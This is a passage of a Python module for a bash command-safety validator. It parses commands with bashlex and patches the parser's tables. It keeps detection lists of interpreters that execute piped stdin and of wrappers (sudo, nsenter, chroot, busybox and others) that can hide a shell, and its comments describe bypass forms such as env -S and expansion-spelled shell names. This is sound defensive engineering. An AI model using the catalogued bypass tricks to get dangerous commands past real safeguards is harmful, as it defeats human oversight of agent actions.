"""Bash command parser using bashlex AST analysis.

This module provides bashlex-based parsing for command safety validation.
It extracts commands from bash syntax and detects dangerous constructs.

The parser is security-critical and REQUIRES bashlex for proper AST parsing.
Regex-based parsing is explicitly NOT supported due to security risks.
"""

import bisect
import itertools
import logging
import posixpath
import re
import shlex
from typing import Any, NamedTuple, Optional

import bashlex
import bashlex.errors

from schlock.exceptions import ParseError

logger = logging.getLogger(__name__)


# Each AND-OR list operator and the `simple_list1` production its `$( … )` close should reduce
# through (discovered by table-walk, never by hardcoded index). The 4-symbol AND_AND/OR_OR rules
# need an extra `newline_list` hop vs the 3-symbol AMPERSAND rule.
_ANDOR_CORRECTION_SPECS = (
    ("AMPERSAND", ("simple_list1", "AMPERSAND", "simple_list1"), False),
    ("AND_AND", ("simple_list1", "AND_AND", "newline_list", "simple_list1"), True),
    ("OR_OR", ("simple_list1", "OR_OR", "newline_list", "simple_list1"), True),
)


def _parse_succeeds(src: str) -> bool:
    """True if vendored bashlex parses ``src`` without raising (used by the correction self-check)."""
    try:
        bashlex.parse(src)
        return True
    except Exception:  # noqa: BLE001 - any failure means "did not parse", which is all we need
        return False


def _andor_correction_self_check() -> bool:
    """Previously-failing AND-OR forms must now parse AND malformed bash must still be rejected."""
    must_parse = ("echo $(a && b)", "echo $(a || b)", "echo $(a & b)")
    must_reject = ("echo $(a &&)", "echo $(&& a)", "echo $(a ||)", "echo $(a && && b)")
    if not all(_parse_succeeds(s) for s in must_parse):
        return False
    return not any(_parse_succeeds(s) for s in must_reject)


def _apply_andor_substitution_correction() -> None:
    """Teach bashlex to parse AND-OR lists (``&&``/``||``/``&``) inside ``$( … )``.

    bashlex 0.18 only accepts ``;``-separated lists inside a command substitution: an AND-OR
    operator there raises ``ParsingError``. Because schlock's safety validator is fail-closed,
    that turns legitimate commands like ``X=$(cd "$(git rev-parse --git-dir)" && pwd)`` into a
    hard block. Upstream (idank/bashlex#54) is unfixed and 0.18 is the latest release, so we
    correct the parser ourselves.

    Root cause: bashlex's own import-time hack ``get_correction_rightparen_states`` adds a
    ``RIGHT_PAREN`` reduce action only to the SEMICOLON continuation state. The sibling AMPERSAND
    / AND_AND / OR_OR continuation states have no ``RIGHT_PAREN`` action, so the closing ``)`` of
    the substitution lands on an error cell. We mirror bashlex's technique and fill those cells.

    Safety: an LALR parse never visits an error (absent) cell, so adding an action to a cell that
    is currently absent cannot change the parse of any input that already parsed — only the
    inputs that previously hit ``p_error`` are affected. We therefore patch a cell ONLY when it is
    absent, and reduce via each operator's own ``simple_list1`` production so the resulting AST
    matches a top-level ``a && b`` list.

    Degrades gracefully: if the table layout ever drifts (new bashlex / arch) and the walk derives
    a wrong cell, a self-check reverts every patched cell and logs a warning, leaving the
    fail-closed status quo (over-block) rather than risking a structurally wrong AST.
    """
    try:
        yp = bashlex.parser.yaccparser
        action, goto, productions = yp.action, yp.goto, yp.productions
        prod_index = {(p.name, tuple(p.prod)): i for i, p in enumerate(productions)}

        def continuation_state(op: str, *, via_newline_list: bool) -> Optional[int]:
            """State reached after shifting ``op`` from the initial ``simple_list1`` state."""
            shifted = action[goto[0]["simple_list1"]].get(op)
            if shifted is None or shifted < 0:  # must be a shift (positive state)
                return None
            table = goto[shifted]
            if via_newline_list:
                nl = table.get("newline_list")
                if nl is None:
                    return None
                table = goto[nl]
            return table.get("simple_list1")

        patched: list[int] = []
        missed = False
        for op, rhs, via_nl in _ANDOR_CORRECTION_SPECS:
            state = continuation_state(op, via_newline_list=via_nl)
            prod = prod_index.get(("simple_list1", rhs))
            if state is None or prod is None:
                # Could not derive this correction — the table layout may have drifted.
                missed = True
                continue
            if action[state].get("RIGHT_PAREN") is not None:
                continue  # already supported/applied — natively fine, never clobber it
            action[state]["RIGHT_PAREN"] = -prod
            patched.append(state)

        # Run the self-check whenever we changed the tables OR a spec failed to derive (drift
        # signal). Only skip it when every spec was already natively supported (nothing patched,
        # nothing missed) — there is then nothing to verify. A bare derivation miss must still
        # warn: a silent degrade to fail-closed over-block is a silent failure.
        if (patched or missed) and not _andor_correction_self_check():
            for state in patched:
                action[state].pop("RIGHT_PAREN", None)
            logger.warning(
                "bashlex AND-OR substitution correction failed self-check; reverted "
                "(legitimate $(a && b) substitutions will be conservatively blocked)"
            )
    except Exception:  # noqa: BLE001 - correction is best-effort; never break import
        logger.warning("bashlex AND-OR substitution correction could not be applied", exc_info=True)


_apply_andor_substitution_correction()

# Interpreters that EXECUTE their standard input as a program when given no program source.
# Used to detect top-level pipe-to-shell (cmd | bash). DELIBERATELY EXCLUDES xargs/env:
# those run a *named* command, not stdin-as-program, and are covered by the download->shell
# and wrapper-command checks.
# A heredoc body is inert text to `cat` and source code to `bash`, which decides
# both whether its matches are suppressed (extract_heredoc_ranges) and whether a
# segment has to carry it (extract_command_segments). One set, so the two answers
# cannot drift apart. Both ask `heredoc_owner`, which sees past a wrapper.
#
# `rbash` is here for the reason it is in STDIN_EXEC_INTERPRETERS below: restricted
# bash still executes its stdin, and a heredoc IS stdin. Without it this set and that
# one disagree about one interpreter - `rbash <<< X` blocks while `rbash <<EOF` does
# not - which is exactly the drift the paragraph above says cannot happen.
#
# `csh`/`tcsh` are here for the same reason: like every Bourne-family shell, invoking
# either with no program source (no `-c`, no script operand) makes it read and execute
# its stdin as a command script - a heredoc or here-string included. LAB-2754 already
# put both in _SHELL_COMMANDS for the `-c` surface; leaving them out here just repeats
# the rbash drift with a different interpreter.
_HEREDOC_SHELL_COMMANDS = frozenset({"bash", "sh", "zsh", "ksh", "dash", "ash", "fish", "rbash", "csh", "tcsh"})

# Quoted-substitution body text may total this many times the command's length
# before extract_quoted_substitution_bodies fails closed. Bodies nest, so text
# is scanned once per enclosing body; an honest command stays under 3x.
_MAX_BODY_TEXT_FACTOR = 4

STDIN_EXEC_INTERPRETERS = frozenset(
    {
        "bash",
        "sh",
        "zsh",
        "dash",
        "ksh",
        "ash",
        "fish",
        "rbash",  # restricted bash still execs its stdin; `rbash -c` is already in _SHELL_COMMANDS
        "csh",  # execs stdin as a script like every other shell here; `csh -c` is in _SHELL_COMMANDS
        "tcsh",  # same as csh - tcsh is its interactive superset, not a different stdin model
        "python",
        "python2",
        "python3",
        "perl",
        "ruby",
        "node",
        "php",
        "php7",
        "php8",
        "lua",
        "lua5.1",
        "lua5.2",
        "lua5.3",
        "lua5.4",
        "luajit",
        "R",
        "Rscript",
        "julia",
        "tclsh",
        "wish",
        "pwsh",
        "powershell",
        "gawk",
        "mawk",
        "nawk",
    }
)

# Per-interpreter flags whose presence supplies an INLINE program (so the interpreter is NOT
# executing piped stdin). Interpreter-specific on purpose: bash -e/-m are NOT code flags
# (errexit/monitor) and must stay dangerous, whereas perl/ruby -e and python -m ARE code.
_INLINE_CODE_FLAGS = {
    "bash": frozenset({"-c"}),
    "sh": frozenset({"-c"}),
    "zsh": frozenset({"-c"}),
    "dash": frozenset({"-c"}),
    "ksh": frozenset({"-c"}),
    "ash": frozenset({"-c"}),
    "fish": frozenset({"-c"}),
    "rbash": frozenset({"-c"}),
    "csh": frozenset({"-c"}),
    "tcsh": frozenset({"-c"}),
    "python": frozenset({"-c", "-m"}),
    "python2": frozenset({"-c", "-m"}),
    "python3": frozenset({"-c", "-m"}),
    "perl": frozenset({"-e", "-E"}),
    "ruby": frozenset({"-e"}),
    "node": frozenset({"-e", "--eval", "-p", "--print"}),
    "php": frozenset({"-r"}),
    "lua": frozenset({"-e"}),
    "lua5.1": frozenset({"-e"}),
    "lua5.2": frozenset({"-e"}),
    "lua5.3": frozenset({"-e"}),
    "lua5.4": frozenset({"-e"}),
    "luajit": frozenset({"-e"}),
    "R": frozenset({"-e"}),
    "Rscript": frozenset({"-e"}),
    "julia": frozenset({"-e"}),
    "pwsh": frozenset({"-c", "-Command", "-EncodedCommand"}),
    "powershell": frozenset({"-c", "-Command", "-EncodedCommand"}),
    # tclsh/wish/awk family: program is a positional file/arg -> no inline-code flag needed
}


# Tokens that explicitly designate STDIN as the program source.
_STDIN_PATHS = frozenset({"-", "/dev/stdin", "/dev/fd/0", "/proc/self/fd/0"})

# Multicall binaries dispatch to an applet named by their first positional arg
# (`busybox sh`, `toybox cat`). Classify the pipeline stage by the resolved applet, not the
# wrapper, so `cat x | busybox sh` is seen as a shell sink while bare `busybox` (no applet) is not.
_MULTICALL_BINARIES = frozenset({"busybox", "toybox"})


# Wrapper commands that pass through execution to subsequent args. Best-effort, NOT an
# exhaustive enumeration - an unknown wrapper degrades to the pre-LAB-2754 behaviour.
# SECURITY: 'env exec bash' executes exec despite env being first word
# Categories for documentation and maintainability:
# - Privilege: sudo, doas, pkexec (escalate privileges)
# - Resource: nice, ionice, timeout, nohup, stdbuf, time (control resources)
# - Execution: env, command, xargs, parallel (modify execution context)
# - Multicall: busybox, toybox (can invoke any applet)
# - Namespace: chroot, nsenter, unshare (container/namespace operations)
#
# This is also the set the `exec`/`eval` wrapper-bypass scan in `has_dangerous_constructs` keys
# on: it TREATS a bare `exec`/`eval` word after one of these as the shell builtin (an
# over-approximation - `sudo exec bash` blocks). A launcher whose own subcommand vocabulary is
# `exec`/`eval` (`uv run … exec`, `firejail … eval`) must therefore NOT go here; it goes in
# `_LAUNCHER_COMMANDS` below. Mirrors PR #204's `_EXEC_BYPASS_SCAN_WRAPPERS` split so the two
# land cleanly in either merge order (LAB-5180).
_EXEC_BYPASS_SCAN_WRAPPERS: frozenset[str] = frozenset(
    {
        # Privilege escalation
        "sudo",  # Run as superuser
        "doas",  # OpenBSD sudo equivalent
        "pkexec",  # PolicyKit execution
        # Resource control
        "nice",  # Adjusts CPU priority
        "ionice",  # Adjusts I/O priority
        "timeout",  # Adds time limit
        "nohup",  # Prevents hangup signals
        "stdbuf",  # Modifies buffering
        "time",  # Times execution
        "chrt",  # Real-time scheduler control
        "taskset",  # CPU affinity
        "prlimit",  # Resource-limit wrapper, `prlimit --opts CMD`
        # Execution context
        "env",  # Modifies environment then executes
        "command",  # Bypasses shell functions/aliases
        "xargs",  # Executes command with piped input
        "parallel",  # GNU parallel execution
        "setsid",  # New session execution
        "flock",  # Lock file, then exec
        "strace",  # Trace, then exec
        "ltrace",  # Trace library calls, then exec
        "systemd-run",  # Run as a transient systemd unit
        "setpriv",  # Drop/alter privileges, then exec
        "unbuffer",  # expect(1) pty wrapper
        "su",  # Switch user (also carries its own -c)
        "runuser",  # su without PAM auth
        "sg",  # Run under a different group
        # Multicall binaries
        "busybox",  # Multi-tool binary (can run any applet)
        "toybox",  # Lightweight busybox alternative
        # Namespace/container operations (CRITICAL - escape vectors)
        "chroot",  # Change root filesystem
        "nsenter",  # Enter namespaces
        "unshare",  # Create namespaces
        "setarch",  # Architecture override
        "linux32",  # 32-bit mode
        "linux64",  # 64-bit mode
        "i386",  # setarch personality alias
        "uname26",  # setarch personality alias (UNAME26)
        "x86_64",  # setarch personality alias
        "arch",  # macOS arch(1): `arch -x86_64 CMD` (on Linux it prints the machine and runs nothing)
        "caffeinate",  # macOS keep-awake wrapper, `caffeinate -i CMD`
        "dbus-run-session",  # `dbus-run-session -- CMD`
        "fakeroot",  # `fakeroot CMD`
        "script",  # `script [-c CMD] file` runs $SHELL on stdin when no -c is given
    }
)

# Launchers that run a caller-supplied command inside an environment or sandbox but use `exec`/
# `eval` as their OWN subcommand (`uv run pytest -k exec`, `firejail --noprofile make eval`).
# They are wrappers for owner/here-string/delegation purposes but are kept out of the exec/eval
# bypass scan so those benign subcommand names are not read as the shell builtin (LAB-5180).
_LAUNCHER_COMMANDS: frozenset[str] = frozenset(
    {
        "uv",  # `uv run CMD`
        "firejail",  # `firejail [--opts] CMD`
    }
)

# Every base name whose operands the owner / here-string / delegation scans treat as a
# pass-through command. Public: the validator imports it.
WRAPPER_COMMANDS: frozenset[str] = _EXEC_BYPASS_SCAN_WRAPPERS | _LAUNCHER_COMMANDS

# A basename that means "a shell we cannot name more precisely": a `$SHELL`-exec wrapper with no
# command, an expansion-spelled command, `parallel` with no command. It is in both
# `_HEREDOC_SHELL_COMMANDS` and `_SHELL_COMMANDS`, so the quoted re-validation path and the
# unquoted regex-suppression path both read the body as code. None would not do: the unquoted
# path reads None as "not a shell" and masks the body (LAB-5180).
_DEFAULT_SHELL = "sh"

# Expansion metacharacters bashlex leaves in a word it did not resolve (`$'bash'` -> `$bash`,
# `{bash,}`, `${X:-bash}`, `/bin/b?sh`).
_EXPANSION_METACHARS = "$`{*?["


def _last_component(word: str) -> str:
    """The text after the last `/` outside `${…}`, `$(…)` and backticks, else the whole word.

    `$VENV/bin/python` -> `python`, while `${SHELL:-/bin/sh}` and `$(command -v sh)` stay whole.
    Each opener closes only on its own bracket (`${` on `}`, `$(` and a `(` nested in it on `)`),
    so the `)` in `${SHELL#)/}` is pattern text. Whatever this scan cannot bracket for certain - a
    quote, backslash, backtick or bare `{` inside an expansion, a closer with nothing open, an
    opener never closed - returns the whole word, which then reads as unresolved.
    """
    closers: list[str] = []
    start, i = 0, 0
    while i < len(word):
        ch = word[i]
        if ch == "$" and word[i + 1 : i + 2] in ("{", "("):
            closers.append("}" if word[i + 1] == "{" else ")")
            i += 2
            continue
        if closers and ch == closers[-1]:
            closers.pop()
        elif ch == "`" and not closers:
            closers.append("`")
        elif closers:
            if ch == "(" and closers[-1] == ")":
                closers.append(")")
            elif ch in "'\"\\`{":
                return word
        elif ch in ")}":
            return word
        elif ch == "/":
            start = i + 1
        i += 1
    return word if closers else word[start:] or word


def names_unresolved_program(word: str) -> bool:
    """True when `word`, read as a command, names a program this parser cannot resolve.

    The one expansion predicate for owner resolution and the delegation scan: the program's own
    name - the last path component outside `${…}`/`$(…)` - still carries an expansion
    metacharacter. `$'bash'`, `${SHELL:-/bin/sh}`, `$(which bash)`, `/bin/b?sh` and `$DIR/$PROG`
    are unresolved; `$VENV/bin/python` names `python`. A variable directory could word-split into
    a different program; reading the last component is the deliberate trade against hard-blocking
    every interpreter run from a variable path (LAB-5180).
    """
    return any(ch in _last_component(word) for ch in _EXPANSION_METACHARS)


def _opts(text: str) -> frozenset:
    return frozenset(text.split())


class _WrapperSpec(NamedTuple):
    """Enough of a wrapper's getopt grammar to find the command it runs.

    ``leading`` positionals come before the command (timeout's DURATION, chroot's NEWROOT, su's
    USER). ``values`` options take the next word and ``flags`` take none, short (clustered or not)
    or long; `--name=value` never takes the next word. Any other option is UNKNOWN. A
    ``shell_exec`` wrapper runs the default shell on its stdin when it has no command, so for it
    an unknown option resolves to that shell; for the rest an unknown option widens the window in
    which the command may sit (`_scan_wrapper_operands`). ``permute`` wrappers (su-style getopt)
    accept options after their positionals; ``assignments`` skips env's `NAME=VALUE`;
    ``subcommand`` is the word the command follows (`uv run CMD`) - without it nothing runs.
    ``drops_leading`` options, in any spelling, remove the leading positional (`runuser -u USER
    CMD`). ``template`` means the command words are a shell snippet the wrapper runs through
    `$SHELL` with each input line appended (GNU parallel), so they are parsed, not just named.
    """

    leading: int = 0
    values: frozenset = frozenset()
    flags: frozenset = frozenset()
    shell_exec: bool = False
    permute: bool = False
    assignments: bool = False
    subcommand: Optional[str] = None
    drops_leading: frozenset = frozenset()
    template: bool = False


# `-c`/`--command` hands these a program to run instead of a shell reading stdin. One table for
# the parser's owner resolution and the validator's `-c` payload extraction. The `-c` program is
# re-validated on its own; one that itself reads stdin (`script -c "$SH"`, `sg G -c 'sh -s'`) is
# not modelled, so its heredoc reads as data (LAB-5295).
DASH_C_WRAPPERS: frozenset[str] = frozenset({"su", "runuser", "sg", "script"})
_DASH_C_OPTS = _opts("-c --command --session-command")

_SU_SPEC = _WrapperSpec(
    leading=1,
    shell_exec=True,
    permute=True,
    values=_opts("-g -G -s -w -u --group --supp-group --shell --whitelist-environment --user"),
    flags=_opts("-m -p -l -f -P -h -V --login --preserve-environment --fast --pty"),
    drops_leading=_opts("-u --user"),  # runuser's command form; su has no -u
)
_PERSONALITY_SPEC = _WrapperSpec(shell_exec=True, flags=_opts("-B -F -I -L -R -S -T -X -Z -3 -v -h -V"))

# How an entry that disagrees with the tool's getopt fails, which is what to check when editing:
# - an option MISSING from both sets is safe: it reads as the shell for a `shell_exec` wrapper and
#   widens the command window by one word for the rest;
# - consuming FEWER words than getopt (a value option listed as a flag, a leading positional
#   under-counted) makes the option's value the command, which fails OPEN;
# - consuming MORE (a flag listed as a value, a leading positional over-counted) swallows the
#   command, which fails open too - unless the wrapper is `shell_exec`, where nothing left means
#   the shell.
# So list an option only as the man page states it. The `shell_exec` short-option sets are
# complete (util-linux 2.41, coreutils 9 --help); their long options are left to "missing".
_WRAPPER_SPECS: "dict[str, _WrapperSpec]" = {
    "unshare": _WrapperSpec(
        shell_exec=True,
        values=_opts("-S -G -R -w -l"),
        flags=_opts(
            "-m -u -i -n -p -U -C -T -r -c -f -h -V --mount --uts --ipc --net --pid --user --cgroup --time"
            " --mount-proc --mount-binfmt --map-root-user --map-current-user --map-auto --fork --kill-child --keep-caps"
        ),
    ),
    "nsenter": _WrapperSpec(
        shell_exec=True,
        # -S/-G take an optional argument from util-linux 2.41 and a required one before it; a
        # value is the reading that stays closed on both.
        values=_opts("-t -N -W -S -G"),
        flags=_opts(
            "-a -m -u -i -n -p -C -U -T -r -w -e -F -c -h -V --all --mount --uts --ipc --net --pid --cgroup --user"
            " --user-parent --time --root --wd --env --no-fork --join-cgroup --preserve-credentials --keep-caps"
        ),
    ),
    "chroot": _WrapperSpec(leading=1, shell_exec=True, flags=_opts("--skip-chdir")),
    "setarch": _PERSONALITY_SPEC._replace(leading=1),
    **dict.fromkeys(("linux32", "linux64", "i386", "x86_64", "uname26"), _PERSONALITY_SPEC),
    "su": _SU_SPEC,
    "runuser": _SU_SPEC,
    "sg": _WrapperSpec(leading=1, shell_exec=True, permute=True),
    "script": _WrapperSpec(
        leading=1,
        shell_exec=True,
        permute=True,
        values=_opts("-I -O -B -T -m -E -o"),
        flags=_opts("-a -e -f -q -t -h -V --append --return --flush --force --quiet"),
    ),
    "fakeroot": _WrapperSpec(shell_exec=True, values=_opts("-l -s -i -b --lib --faked --fd-base"), flags=_opts("-u -h -v")),
    "firejail": _WrapperSpec(shell_exec=True),  # options are `--name[=value]`; a bare one reads as unknown
    "env": _WrapperSpec(
        assignments=True,
        values=_opts("-u -C --unset --chdir"),
        flags=_opts(
            "-i -0 -v --ignore-environment --null --debug --list-signal-handling --block-signal --default-signal --ignore-signal"
        ),
    ),
    "timeout": _WrapperSpec(
        leading=1, values=_opts("-s -k --signal --kill-after"), flags=_opts("-v --foreground --preserve-status")
    ),
    "nice": _WrapperSpec(values=_opts("-n --adjustment")),
    "ionice": _WrapperSpec(values=_opts("-c -n -p -P -u"), flags=_opts("-t")),
    "stdbuf": _WrapperSpec(values=_opts("-i -o -e")),
    "sudo": _WrapperSpec(values=_opts("-u -g -C -h -p -r -t -T -R -U -D"), flags=_opts("-A -b -E -H -k -K -n -P -S")),
    "doas": _WrapperSpec(values=_opts("-u -C"), flags=_opts("-n -s -L")),
    "flock": _WrapperSpec(
        leading=1,
        values=_opts("-w -E -c --timeout --conflict-exit-code --command"),
        flags=_opts("-s -x -n -u -o -F -e --shared --exclusive --nonblock --unlock --close --no-fork --fcntl --verbose"),
    ),
    "strace": _WrapperSpec(
        values=_opts("-a -b -e -E -I -o -O -p -P -s -S -u -U -X"),
        flags=_opts("-A -c -C -d -D -f -F -h -i -k -n -q -r -t -T -v -V -w -x -y -z -Z"),
    ),
    "ltrace": _WrapperSpec(
        values=_opts("-a -A -D -e -F -l -n -o -p -s -u -w -x"), flags=_opts("-b -c -C -f -h -i -L -r -S -t -T -V")
    ),
    "chrt": _WrapperSpec(leading=1, values=_opts("-T -P -D"), flags=_opts("-a -b -d -e -f -i -m -o -p -r -R -v")),
    "taskset": _WrapperSpec(leading=1, flags=_opts("-a -c -p")),
    "prlimit": _WrapperSpec(values=_opts("-p")),
    "caffeinate": _WrapperSpec(values=_opts("-t -w"), flags=_opts("-d -i -m -s -u")),
    "dbus-run-session": _WrapperSpec(values=_opts("--config-file --dbus-daemon")),
    "time": _WrapperSpec(values=_opts("-o -f"), flags=_opts("-a -p -q -v")),
    "pkexec": _WrapperSpec(values=_opts("--user")),
    "arch": _WrapperSpec(values=_opts("-arch -d -e"), flags=_opts("-x86_64 -arm64 -arm64e -i386 -32 -64 -c -h")),  # macOS
    "xargs": _WrapperSpec(values=_opts("-a -d -E -I -L -n -P -s"), flags=_opts("-0 -e -i -l -o -p -r -t -x")),
    # GNU parallel runs its input lines as commands when it has no template, so it is `shell_exec`:
    # an option it does not list reads as the shell. From parallel(1); only options whose arity
    # the man page states are listed. Optional-argument options (`-e`, `-i`, `-l`, `--replace`)
    # take their argument attached, so as a separate word they are flags.
    "parallel": _WrapperSpec(
        shell_exec=True,
        template=True,
        values=_opts(
            "-a -C -d -E -I -j -J -L -n -N -P -S -s --arg-file --arg-file-sep --arg-sep --basefile --bf --block"
            " --block-size --colsep --compress-program --decompress-program --delay --delimiter --env --filter"
            " --group-by --halt --halt-on-error --header --jobs --joblog --limit --load --max-args --max-chars"
            " --max-lines --max-procs --max-replace-args --memfree --memsuspend --nice --profile --recend"
            " --recstart --res --results --retries --return --rpl --ssh --sshdelay --sshlogin --sshloginfile"
            " --slf --tag-string --tagstring --template --termseq --tf --timeout --tmpdir --transferfile --trc"
            " --trim --wd --workdir"
        ),
        flags=_opts(
            "-0 -e -g -h -i -k -l -m -p -q -r -t -u -v -V -x -X --bar --bg --cat --cleanup --csv --dry-run"
            " --dryrun --eta --fg --fifo --files --group --keep-order --lb --line-buffer --linebuffer"
            " --no-notice --no-run-if-empty --nonall --null --onall --pipe --pipepart --plus --progress --quote"
            " --replace --resume --resume-failed --retry-failed --round-robin --semaphore --shuf --spreadstdin"
            " --tag --tee --transfer --ungroup --verbose --version --will-cite --xargs"
        ),
    ),
    # From `uv run --help` (uv 0.10). Not `shell_exec`: a missing option widens the window.
    "uv": _WrapperSpec(
        subcommand="run",
        values=_opts(
            "-C -P -f -i -p -w --allow-insecure-host --cache-dir --color --config-file --config-setting"
            " --config-settings-package --default-index --directory --env-file --exclude-newer --exclude-newer-package"
            " --extra --extra-index-url --find-links --fork-strategy --group --index --index-strategy --index-url"
            " --keyring-provider --link-mode --no-binary-package --no-build-isolation-package --no-build-package"
            " --no-extra --no-group --no-sources-package --only-group --package --prerelease --project --python"
            " --python-platform --refresh-package --reinstall-package --resolution --upgrade-package --with"
            " --with-editable --with-requirements"
        ),
        flags=_opts(
            "-U -h -m -n -q -s -v --active --all-extras --all-groups --all-packages --compile-bytecode --exact"
            " --frozen --gui-script --help --isolated --locked --managed-python --module --native-tls --no-binary"
            " --no-build --no-build-isolation --no-cache --no-config --no-default-groups --no-dev --no-editable"
            " --no-env-file --no-index --no-managed-python --no-progress --no-project --no-python-downloads"
            " --no-sources --no-sync --offline --only-dev --quiet --refresh --reinstall --script --upgrade"
            " --verbose"
        ),
    ),
}
_DEFAULT_SPEC = _WrapperSpec()
_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")


def _option_kind(arg: str, spec: _WrapperSpec, dash_c: bool) -> str:  # noqa: PLR0911 - one return per getopt case
    """`value` (takes the next word), `flag`, `unknown`, or `dash_c` (the option supplies the program)."""
    if arg.startswith("--"):
        name, has_value, _ = arg.partition("=")
        if dash_c and name in _DASH_C_OPTS:
            return "dash_c"
        if has_value or name in spec.flags:
            return "flag"
        return "value" if name in spec.values else "unknown"
    if arg in spec.values:  # exact first: single-dash long options (`arch -arch x86_64`)
        return "value"
    if arg in spec.flags:
        return "flag"
    for at, ch in enumerate(arg[1:], start=2):  # a short cluster, read as getopt does
        opt = f"-{ch}"
        if dash_c and opt == "-c":
            return "dash_c"
        if opt in spec.values:
            return "value" if at == len(arg) else "flag"  # else the rest of the cluster is its value
        if opt not in spec.flags:
            return "unknown"
    return "flag"


def _sets_option(arg: str, spec: _WrapperSpec, names: frozenset) -> bool:
    """True if option word ``arg`` sets one of ``names``: `--user`, `--user=x`, `-u`, `-lu`."""
    if arg.startswith("--"):
        return arg.partition("=")[0] in names
    for ch in arg[1:]:
        if f"-{ch}" in names:
            return True
        if f"-{ch}" in spec.values:
            return False  # the rest of the cluster is that option's value
    return False


def _template_runs_code(words: list[str]) -> bool:  # noqa: PLR0911 - one return per way a line runs
    """True if a GNU parallel command template may run its input line as code.

    parallel joins the template words, appends each line (quoted) and runs the result through
    `$SHELL`, so the template is parsed as the shell snippet it is: `'sh -c'`, `'echo {} | sh'`,
    `'{}'` and `env` all run the line, `echo {}` and `gzip -9` do not. No template (only `:::`
    arguments) or one this parser cannot read is code - fail closed.

    Never recursive: a template whose own command is another template runner (`parallel parallel
    …`) is code outright rather than parsed again, so the cost is one parse however the words nest.
    Recursing there cost two operand scans per level - exponential in the nesting - and a hook
    that outlives its timeout fails open.
    """
    template = list(itertools.takewhile(lambda word: not word.startswith(":::"), words))
    if not template:
        return True
    try:
        nodes = bashlex.parse(" ".join(template))
    except Exception:  # noqa: BLE001 - a template bashlex cannot read is one we cannot vouch for
        return True
    for node in nodes:
        for cmd in _command_nodes(node):
            cmd_words = _command_words(cmd)
            if not cmd_words or names_unresolved_program(cmd_words[0]):
                return True  # `X=1` or `$CMD`: the appended line is, or picks, the command
            head = cmd_words[0].split("/")[-1]
            if head in _HEREDOC_SHELL_COMMANDS or head in (".", "source"):
                return True
            if not _is_wrapper(head):
                continue
            if _WRAPPER_SPECS.get(head, _DEFAULT_SPEC).template:
                return True
            operands = expand_env_split_string(head, cmd_words[1:])
            if any(word.split("/")[-1] in _HEREDOC_SHELL_COMMANDS for word in operands):
                return True
            candidates, runs_code = _scan_wrapper_operands(head, operands)
            if runs_code or not candidates:
                return True  # `env`, `timeout 5`: the appended line becomes the command
    return False


def _scan_wrapper_operands(base: str, operands: list[str]) -> "tuple[list[str], bool]":  # noqa: PLR0912
    """``(candidates, runs_code)`` for wrapper ``base`` given the words after it.

    ``candidates`` are the words that may be the command the wrapper runs: the positional after
    ``leading`` ones, widened by one per unknown option (any of which may have taken one word as
    its value). So a missing table entry can only over-read, never hide `$SH`. A literal command's
    own arguments are not candidates (`sudo -u pg psql "$DB"`). ``runs_code`` is True when a
    candidate names an unresolved program, a ``template`` runs its line as code, or a
    ``shell_exec`` wrapper has no command or meets an unknown option. A `-c`/`--command` on a
    `DASH_C_WRAPPERS` member supplies the program instead of a shell reading stdin, so neither
    holds (see `DASH_C_WRAPPERS` for the case that leaves open).
    """
    spec = _WRAPPER_SPECS.get(base, _DEFAULT_SPEC)
    dash_c = base in DASH_C_WRAPPERS
    leading, slack, positionals, positional_at = spec.leading, 0, [], []
    awaiting_subcommand, options_done, i = spec.subcommand is not None, False, 0
    while i < len(operands) and (spec.permute or len(positionals) <= leading + slack):
        arg = operands[i]
        i += 1
        if options_done or not arg.startswith("-") or arg == "-":
            if arg == "-" and not options_done and not positionals:
                continue  # env's and su's `-`: a flag before any operand; after one it is an operand
            if awaiting_subcommand:
                awaiting_subcommand = arg != spec.subcommand
            elif not (spec.assignments and not positionals and _ASSIGNMENT_RE.match(arg)):
                positionals.append(arg)
                positional_at.append(i - 1)
            continue
        if arg == "--":
            options_done = True
            continue
        kind = _option_kind(arg, spec, dash_c)
        if kind == "dash_c":
            return [], False
        if kind == "unknown":
            if spec.shell_exec:
                return [], True
            slack += 1
            continue
        if spec.drops_leading and _sets_option(arg, spec, spec.drops_leading):
            leading = 0
        if kind == "value":
            i += 1
    if awaiting_subcommand:
        return [], False
    candidates = positionals[leading : leading + slack + 1]
    if spec.template and candidates:
        return candidates, _template_runs_code(operands[positional_at[leading] :])
    runs_code = any(names_unresolved_program(word) for word in candidates) or (spec.shell_exec and not candidates)
    return candidates, runs_code


def _is_dynamic_loader(base: str) -> bool:
    """True for the ELF dynamic loader run as a program launcher (`ld-linux-x86-64.so.2 bash`)."""
    return base == "ld.so" or (base.startswith(("ld-linux", "ld-musl", "ld64", "ld-2")) and ".so" in base)


def _is_wrapper(word: str) -> bool:
    base = word.split("/")[-1]
    return base in WRAPPER_COMMANDS or _is_dynamic_loader(base)


def _sources_stdin(args: list[str]) -> bool:
    """True if `. FILE` / `source FILE` would read its stdin, or a file this parser cannot name."""
    target = next(iter(args[1:] if args[:1] == ["--"] else args), None)
    if target is None:
        return False  # `.` with no file is an error; nothing runs
    if names_unresolved_program(target):
        return True
    path = posixpath.normpath(target)  # `/dev/fd//0`, `/dev/fd/./0`, `/dev/../dev/stdin` are all stdin
    return path in ("-", "stdin") or path.endswith(("/stdin", "/fd/0"))


def expand_env_split_string(base: str, args: list[str]) -> list[str]:
    """Expand `env -S`'s combined string into separate tokens, else return `args` unchanged.

    `env -S 'bash -e'`, `env -Sbash`, `env --split-string=bash` all hand env a single word it
    re-splits into a command line. Recovering the tokens lets the shell operand (`bash`) be seen
    (LAB-5180). Only `env` is treated this way.
    """
    if base != "env":
        return args
    out: list[str] = []
    i = 0
    while i < len(args):
        arg = args[i]
        payload: Optional[str] = None
        if arg in ("-S", "--split-string") and i + 1 < len(args):
            payload = args[i + 1]
            i += 2
        elif arg.startswith("-S") and len(arg) > 2:
            payload = arg[2:]
            i += 1
        elif arg.startswith("--split-string="):
            payload = arg.split("=", 1)[1]
            i += 1
        else:
            out.append(arg)
            i += 1
            continue
        try:
            out.extend(shlex.split(payload))
        except ValueError:
            out.append(payload)  # unbalanced quotes: keep the raw word, fails closed downstream
    return out


def _resolve_multicall(cmd_name: str, args: list[str]) -> tuple[str, list[str]]:
    """Resolve a multicall binary to its effective applet and that applet's args.

    `busybox sh -c x` -> ('sh', ['-c', 'x']); `busybox ls` -> ('ls', []); bare `busybox` or
    `busybox --help` (no applet) -> unchanged. Non-multicall commands pass through untouched.
    """
